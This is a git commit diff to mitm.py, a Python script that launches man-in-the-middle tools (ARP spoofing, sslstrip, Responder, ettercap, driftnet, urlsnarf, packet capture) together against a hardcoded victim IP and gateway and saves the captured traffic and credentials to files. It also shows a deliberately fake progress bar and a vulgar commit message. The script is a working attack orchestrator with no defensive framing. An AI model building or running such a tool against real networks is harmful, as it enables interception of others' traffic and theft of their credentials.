6e3db32008f2ff33c95c26e494bd2889ce59ab4e
ShaharPT <57047724+shahar69@users.noreply.github.com>
2023-05-18 18:12:05 +0300

    fucked orchuks mom

--- mitm.py
+++ mitm.py
@@ -1,56 +1,73 @@
 import asyncio
+import os
+import time
+from rich.progress import Progress
 from rich.console import Console
-from rich.panel import Panel
 
 console = Console()
 
 
-async def run_tool(tool_name, command, *args):
-    output = f'[bold]{tool_name}[/bold]'
-    console.print(Panel(output, title=tool_name))
-
+async def run_tool(tool_name, command, *args, task):
+    console.print(f'\n[INFO] Starting {tool_name}...')
     process = await asyncio.create_subprocess_exec(
         command, *args,
         stdout=asyncio.subprocess.PIPE,
-        stderr=asyncio.subprocess.PIPE
+        stderr=asyncio.subprocess.PIPE,
     )
 
-    async for line in process.stdout:
-        output = f'[bold]{tool_name}[/bold]\n{line.decode("utf-8")}'
-        console.print(Panel(output, title=tool_name))
-
-    return process.returncode
-
-
-async def start_sslstrip():
-    return await run_tool('SSL Strip', 'sslstrip')
-
-
-async def start_arpspoof(interface, victim_ip, gateway_ip):
-    return await run_tool('ARP Spoof', 'arpspoof', '-i', interface, '-t', victim_ip, gateway_ip)
-
-
-async def start_responder(interface):
-    return await run_tool('Responder', 'responder', '-I', interface)
-
-
-async def start_ettercap(interface, victim_ip, gateway_ip):
-    return await run_tool('Ettercap', 'ettercap', '-T', '-q', '-i', interface, '-M', 'arp',
-                          f'/{victim_ip}//{gateway_ip}//')
+    stdout, stderr = await process.communicate()
+    task['finished'] = True
+    output_file = os.path.join('mitm_output', f'{tool_name}.txt')
+    with open(output_file, 'wb') as file:
+        file.write(stdout + b'\n' + stderr)
 
 
 async def main():
-    interface = input('Enter the interface (default: eth0): ') or 'eth0'
-    victim_ip = input('Enter the victim IP: ')
-    gateway_ip = input('Enter the gateway IP: ')
+    console.print('\n🛠 [INFO] MITM Tools Launcher 🛠\n')
 
-    sslstrip_task = asyncio.create_task(start_sslstrip())
-    arpspoof_task = asyncio.create_task(start_arpspoof(interface, victim_ip, gateway_ip))
-    responder_task = asyncio.create_task(start_responder(interface))
-    ettercap_task = asyncio.create_task(start_ettercap(interface, victim_ip, gateway_ip))
+    # Predefined values for interface, victim IP, and gateway IP
+    interface = 'eth0'
+    victim_ip = '192.168.1.100'
+    gateway_ip = '192.168.1.1'
 
-    await asyncio.gather(sslstrip_task, arpspoof_task, responder_task, ettercap_task)
+    tasks = [
+        {'emoji': '🔒', 'name': 'SSL Strip', 'finished': False, 'completed': 0,
+         'command': ('sslstrip', '-i', interface, '-a', '-w', os.path.join('mitm_output', 'sslstrip.pcap'))},
+        {'emoji': '🎣', 'name': 'ARP Spoof', 'finished': False, 'completed': 0,
+         'command': ('arpspoof', '-i', interface, '-t', victim_ip, gateway_ip)},
+        {'emoji': '🔑', 'name': 'Responder', 'finished': False, 'completed': 0,
+         'command': ('responder', '-I', interface)},
+        {'emoji': '👁', 'name': 'Ettercap', 'finished': False, 'completed': 0,
+         'command': ('ettercap', '-T', '-q', '-i', interface)},
+        {'emoji': '🌐', 'name': 'Driftnet', 'finished': False, 'completed': 0, 'command': ('driftnet', '-i', interface)},
+        {'emoji': '🔗', 'name': 'Urlsnarf', 'finished': False, 'completed': 0, 'command': ('urlsnarf', '-i', interface)},
+        {'emoji': '🕵️', 'name': 'Wireshark', 'finished': False, 'completed': 0,
+         'command': ('wireshark', '-k', '-i', interface, '-w', os.path.join('mitm_output', 'wireshark.pcap'))},
+        {'emoji': '📦', 'name': 'Tcpdump', 'finished': False, 'completed': 0,
+         'command': ('tcpdump', '-i', interface, '-w', os.path.join('mitm_output', 'tcpdump.pcap'))},
+    ]
+
+    # Create mitm_output folder if it doesn't exist
+    output_directory = 'mitm_output'
+    if not os.path.exists(output_directory):
+        os.makedirs(output_directory)
+
+    with Progress() as progress:
+        task_ids = [progress.add_task(f"{task['emoji']} [cyan]{task['name']}", total=100) for task in tasks]
+
+        for i, task in enumerate(tasks):
+            asyncio.create_task(run_tool(task['name'], *task['command'], task=task))
+
+        start_time = time.time()
+        while not all(task['finished'] for task in tasks):
+            for i, task in enumerate(tasks):
+                if not task['finished']:
+                    elapsed_time = time.time() - start_time
+                    fake_progress = min(100, int(elapsed_time * 20))
+                    progress.update(task_ids[i], completed=fake_progress)
+
+            await asyncio.sleep(0.1)
 
 
-def run():
+if __name__ == '__main__':
     asyncio.run(main())
